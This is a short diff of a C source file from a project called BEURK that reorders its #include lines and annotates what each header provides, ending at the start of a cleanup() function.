@@ -18,12 +18,12 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include <string.h>
-#include <unistd.h>
-#include <stdio.h>
-#include <fcntl.h>
-#include <utmp.h>
 #include "beurk.h"
+#include <string.h> /* memset() */
+#include <unistd.h> /* lseek(), read(), write(), close() */
+#include <stdlib.h> /* free() */
+#include <fcntl.h> /* O_RDWR */
+#include <utmp.h> /* struct utmp */
 
 void    cleanup(void *var, size_t len) {
     DEBUG(D_INFO, "Calling cleanup");
